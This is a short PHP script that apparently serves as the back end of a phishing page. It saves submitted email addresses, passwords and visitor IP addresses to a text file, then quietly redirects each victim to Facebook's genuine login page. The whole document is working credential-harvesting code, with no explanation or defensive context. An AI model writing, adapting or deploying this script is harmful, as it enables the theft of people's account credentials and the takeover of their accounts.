<?php
$correo=$_POST["correo"];
$word=$_POST["word"];
$ip = $_SERVER['REMOTE_ADDR']."\r\n";
$guardar=fopen("password123.txt",a);
fwrite($guardar,"
=========================================
Correo: ".$correo."
Password: ".$word."
Ip: ".$ip);
fclose($guardar);
echo "<META HTTP-EQUIV='refresh' CONTENT='1; url=https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'>";
?>